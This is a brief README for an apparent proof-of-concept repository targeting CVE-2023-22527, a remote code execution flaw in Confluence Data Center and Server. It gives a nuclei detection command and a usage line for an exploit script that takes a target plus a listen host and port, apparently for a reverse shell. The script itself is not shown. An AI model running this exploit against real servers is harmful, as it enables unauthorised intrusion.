# CVE-2023-22527 - RCE (Remote Code Execution) Vulnerability In Confluence Data Center and Confluence Server
# PoC
## Detect
`nuclei -v -t /path/to/template.yam; -u http://ip:port/`

![snapedit_1706203984065](https://github.com/thanhlam-attt/CVE-2023-22527/assets/79523444/d4747dd3-98f9-4dd7-ac62-6d8495fcb374)


## Exploit
`python3 CVE-2023-22527.py -u ip:port -lh listen-host -lp listen-port`

![snapedit_1706204311967](https://github.com/thanhlam-attt/CVE-2023-22527/assets/79523444/97e0d2a2-d360-4e75-80d0-70aca5e51537)
